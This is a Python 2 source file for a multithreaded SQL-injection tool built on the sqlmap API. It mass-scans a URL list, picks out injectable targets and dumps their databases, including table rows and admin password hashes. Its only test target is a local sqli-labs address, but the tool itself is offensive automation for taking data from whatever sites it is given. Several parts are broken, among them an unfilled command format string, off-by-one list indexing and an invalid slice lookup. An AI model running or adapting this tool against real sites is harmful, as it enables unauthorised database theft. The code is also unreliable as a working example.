import queue
import threading
import subprocess
import sys
import sqlmapAPI
import lib.config
import time
import re


class sqlmapController():
    def __init__(self):
        self.sqlmapPath = lib.config.SQLmapFileDir
        self.sqlmapHost = lib.config.SQLmapHost
        self.sqlmapPort = lib.config.SQLmapPort
        self.TaskList = [] # On loading task
        self.Queue = queue.Queue() # Task queue
        self.VulnerableUrlList = []
        self.Thread = 10 # Thread. Change thread value here.
        self.sqlmapApi = sqlmapAPI.sqlmapApi()
        self.CallMode = 'print' # 'direct' for direct output. Test function only. Will be updated after 1.1.0 stable version.
        self._Time = 0
        pass


    def CheckSQLInjection(self, mode, UrlList):
        if mode == 'call':
            pass
        elif mode == 'api':
            pass
        else: # Todo: New integrated sqlmap
            pass


    def Startsqlmap(self, UrlList):
        file = open('urllist', 'w+')
        file.writelines(UrlList)
        file.close()
        print '[*] Starting sqlmap.'
        subprocess.Popen('python %s/sqlmap.py -m urllist --dump', shell=True)
        return


    def CheckTarget(self, UrlList):
        self.sqlmapApi.InitalizeServer()
        for item in UrlList:
            self.Queue.put(item)
        timer = threading.Thread(target=self._Timer)
        timer.setDaemon(True)
        watchdog = threading.Thread(target=self._Watchdog)
        watchdog.setDaemon(True)
        timer.start()
        watchdog.start()
        while self.Queue.qsize():
            if len(self.TaskList) < self.Thread:
                threading.Thread(target=self.StartScan, args=[self.Queue.get()]).start()
        time.sleep(1) # For race condition
        while len(self.TaskList):
            pass
        print '[*] Scan completed.'
        if not len(self.VulnerableUrlList):
            print '[*] No vulnerable URL found.'
            self.Bite()
            return
        print '[+] %s vulnerable URL found.' %(len(self.VulnerableUrlList))
        for i in range(len(self.VulnerableUrlList)):
            print '[+]   | id: %s Url: %s' %(i+1 ,UrlList[i-1])
        print '[+] Url list end.'
        id = raw_input('[*] Please provide url id to continue: ')
        if not id:
            id = 1
        if raw_input('[*] Please provide scan mode (M for manual, f for auto): ').upper() == 'F':
            self.DumpDatabase(UrlList[int(id)])
        else:
            self.FetchDBManual(UrlList[int(id)-1])
        return



    def StartScan(self, url): # Start scan, save into list.
        taskid = self.sqlmapApi.NewTask()
        self.TaskList.append({'id': taskid, 'url': url})
        self.sqlmapApi.StartScan(taskid, url)
        print '[+] Started scan for %s, id: %s' %(url, str(taskid))
        return


    def _Watchdog(self): # Watchdog. Remove completed task.
        print '[*] Loading Watchdog.'
        time.sleep(1) # Nasty hack for race condition.
        print '[*] Watchdog initialized.'
        while len(self.TaskList) != 0:
            time.sleep(10)
            for item in self.TaskList:
                TaskStatus = self.sqlmapApi.GetStat(item['id'])
                if TaskStatus['status'] == 'terminated':
                    self.TaskLog = self.sqlmapApi.FetchLog(item['id'])
                    if self.TaskLog['success'] == True and re.findall('GET parameter \'?.*\' is \'.*\' injectable', str(self.TaskLog)) or 'the back-end DBMS is ' in str(self.TaskLog):
                        print '[+] %s is vulnerable.' %(item['url'])
                        if raw_input('[+] Do you want to stop scanning task? (Y/n)').upper() != 'N':
                            print '[+] Scan completed. Ending task.'
                            self.Bite()
                        self.VulnerableUrlList.append(item['url'])
                        self.Bite()
                    else:
                        self.TaskList.remove(item)
                else:
                    print '[*] Scanning URL %s, time cost: %s, %s item(s) left.' %(str(item['url']), str(self._Time), len(self.TaskList))
        return


    def _Timer(self): #  Timer.
        while len(self.TaskList) != 0:
            time.sleep(1)
            self._Time += 1


    def Bite(self): # You forgot to feed the dog.
        while len(self.TaskList):
            self.TaskList.pop()
        while self.Queue.qsize():
            self.Queue.get()
        return


    def DumpDatabase(self, url): # Dump database.
        try:
            taskid = self.sqlmapApi.NewTask()
            self.sqlmapApi.SetOptions(taskid, 'dumpAll', 'true')
            self.sqlmapApi.StartScan(taskid, url)
            self.TaskList.append(url)
            thread = threading.Thread(target=self.ShowDBInfo, args=[taskid])
            thread.setDaemon(True)
            thread.start()
            while len(self.TaskList):
                pass
        except Exception, e:
            print '[!] Failed to dump target database: %s' %(str(e))
            pass


    def ShowDBInfo(self, id):
        Timer = '000000'
        while len(self.TaskList):
            try:
                time.sleep(1)
                if self.sqlmapApi.GetStat(id)['status'] == 'terminated':
                    if self.sqlmapApi.FetchLog(id)['success'] == True:
                        print '[+] Check completed.'
                        while len(self.TaskList):
                            self.TaskList.pop()
                        pass
                    else:
                        StatLog = self.sqlmapApi.GetStat(id)
                        for item in StatLog:
                            if int(item['time'].replace(':', '')) > int(Timer):
                                print '[*] [%s@%s] %s' %(item['level'], item['time'], item['message'])
                        Timer = StatLog[::1]['time'].replace(':', '')
            except KeyboardInterrupt:
                if raw_input('[*] Got keyboard interrupt. Do you want to stop fetching database?(Y/n)').upper() != 'N':
                    self.Bite()
                    print '[+] Cleared task list.'
                    return
                pass
            except Exception, e:
                print '[!] Failed to fetch target database: %s' %(str(e))
                self.Bite()
        print '[+] Check completed.'
        return


    def FetchDBManual(self, url):
        try:
            taskid = self.sqlmapApi.NewTask()
            self.sqlmapApi.SetOptions(taskid, 'getDbs', 'true')
            self.TaskList.append({'id': taskid, 'url': url})
            self.sqlmapApi.StartScan(taskid, url)
            self.ShowDBInfo(taskid)
            print '[*] Fetch database completed.'
            DatabaseList = self.sqlmapApi.GetData(taskid)['data'][2]['value']
            print '[*] Incoming database list.'
            for i in range(len(DatabaseList)):
                print 'id: %s, database name: %s' %(str(i+1), DatabaseList[i])
            DatabaseName = DatabaseList[int(raw_input('[*] Provide database id: '))-1]
            taskid = self.sqlmapApi.NewTask()
            self.sqlmapApi.SetOptions(taskid, 'getTables', 'true',)
            self.sqlmapApi.SetOptions(taskid, 'db', '"%s"' %(DatabaseName))
            self.TaskList.append({'id': taskid, 'url': url})
            self.sqlmapApi.StartScan(taskid, url)
            self.ShowDBInfo(taskid)
            print '[*] Fetch table completed.'
            TableList = self.sqlmapApi.GetData(taskid)['data'][2]['value'][DatabaseName]
            print '[*] Incoming table list.'
            for i in range(len(TableList)):
                print 'id: %s, table name: %s' % (str(i + 1), TableList[i])
            TableName = TableList[int(raw_input('[*] Provide table id: '))-1]
            self.sqlmapApi.SetOptions(taskid, 'getColumns', 'true')
            self.sqlmapApi.SetOptions(taskid, 'tbl', '"%s"' %(TableName))
            self.sqlmapApi.SetOptions(taskid, 'dumpTable', 'true')
            self.TaskList.append({'id': taskid, 'url': url})
            self.sqlmapApi.StartScan(taskid, url)
            self.ShowDBInfo(taskid)
            ColumnDataList = self.sqlmapApi.GetData(taskid)
            ColumnList = ColumnDataList['data'][3]['value'][DatabaseName][TableName].keys()
            print '[*] Incoming column list.'
            PrintText = ' |   '
            for i in range(len(ColumnList)):
                PrintText += ColumnList[i].ljust(10)
            print PrintText
            ColumnvalList = [] # [[row1], [row2], [rown], [rown+1], [rown+2], [rowOWO)]]
            for i in range(len(ColumnDataList)):
                ColumnvalList.append([])
            RawColumnData = ColumnDataList['data'][4]['value']
            if RawColumnData.has_key('__infos__'):
                RawColumnData.pop('__infos__')
            for item in RawColumnData.values():
                while len(item['values']) < len(ColumnvalList):
                    item['values'].append('-')
            for i in range(len(ColumnvalList)):
                for item in RawColumnData.values():
                    ColumnvalList[i].append(item['values'][i])
            for i in ColumnvalList:
                PrintText = ' |    '
                for j in i:
                    PrintText += j.ljust(10, ' ')
                print PrintText
            if raw_input('[*] Do you want to check admin hash(if this is admin table)?(Y/n) ').upper() != 'N':
                AdminRow = raw_input('[*] Please import row name: ')
                print '[+] Data fetch completed, starting check hash.'
                return RawColumnData[AdminRow]
        except Exception, e:
            print '[!] Failed to fetch row: %s' %(str(e))
            return
        print '[+] Data fetch completed.'
        return


def test():
    controller = sqlmapController()
    controller.CheckTarget(['http://192.168.0.105:8081/sqli-labs/Less-1?id=2'])
test()